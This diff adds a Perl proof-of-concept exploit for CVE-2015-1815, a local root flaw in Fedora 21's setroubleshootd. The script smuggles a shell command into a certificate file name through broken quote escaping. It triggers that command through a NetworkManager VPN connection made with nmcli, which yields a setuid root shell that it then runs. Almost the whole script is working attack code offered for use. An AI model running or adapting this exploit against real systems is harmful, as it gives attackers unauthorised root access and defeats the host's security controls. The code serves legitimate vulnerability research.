@@ -1,0 +1,46 @@
+#!/usr/bin/perl
+
+# Fedora21 setroubleshootd local root PoC (CVE-2015-1815)
+#
+# requires polkit authorization to add/mod VPN connections
+# to NetworkManager (default on desktop user)
+#
+# I say: lulz!
+#
+# (C) 2015 Sebastian Krahmer
+#
+#
+# create a pathname that setroubleshootd will eventually
+# query sh -c { rpm -qf ... with, fucking up ' escaping. So the
+# embedded pathname is then evaluated as command
+#
+# There goes your NSA-grade SELinux security.
+
+#$command = "id|logger";
+
+# full blown rootshell to disable SELinux
+$command="cd var;cd lib;cd setroubleshoot;cat \$SHELL > sh;chmod 04755 sh";
+$boomsh = "/var/lib/setroubleshoot/sh";
+
+$file = "/tmp/7350.pem';$command;echo '";
+open(O, ">", $file) or die $!;
+close O;
+
+# add connection
+system("nmcli c add type vpn ifname FOOBAR vpn-type openvpn");
+open(O,"|nmcli c edit vpn-FOOBAR") or die $!;
+
+print O "set vpn.data ca = /tmp/7350.pem';$command;echo ', password-flags = 1, connection-type = password, remote = 1.2.3.4, username = FOOBAR\n";
+print O "set vpn.secrets password=1\nsave\nquit\n";
+close(O);
+
+print "[*] Triggering vulnerability for boomsh ...\n";
+
+while (((stat($boomsh))[2] & 04000) != 04000) {
+	system("nmcli c up vpn-FOOBAR");
+	sleep(10);
+}
+
+print "\n[!] Found boomsh mode 04755! Domains dont contain!\n";
+exec($boomsh, "-p");
+
